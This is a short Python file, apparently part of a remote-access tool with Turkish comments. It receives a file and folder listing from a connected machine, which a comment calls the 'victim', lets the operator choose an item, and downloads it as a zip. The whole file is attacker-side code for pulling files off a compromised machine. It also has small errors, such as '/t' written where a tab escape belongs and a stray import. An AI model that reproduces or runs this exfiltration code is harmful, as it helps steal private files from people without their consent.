import json

from isort import file
CHUNKSIZE = 4 * 1024

DELIMETER = "<END_OF_RESULTS>"

# Dosya listesini aliyoruz ve alacagimiz dosyayi seciyoruz


def receive_file_folders(my_socket):
    print("[+] Dosya/ Klasor testi")
    full_list = b''
    while True:
        chunk = my_socket.client_conn.recv()
        if chunk.endswith(DELIMETER.encode()):
            chunk = chunk[:-len(DELIMETER)]
            full_list += chunk
            break
        full_list += chunk

    files_dict = json.loads(full_list)

    # Dosya listesi Kullaniciya gosteriliyor ve bir secim yapmasini isteniyor
    for index in files_dict:
        print("/t/t", index, "/t", files_dict[index])

    file_index = input("[+] Select the  file/folder")
    file2download = files_dict[file_index]
    my_socket.send_data(file2download)

    # Receive filename then the file data from client (victim)

    zipped_file = my_socket.receive_data()
    my_socket.receive_zipped(zipped_file)
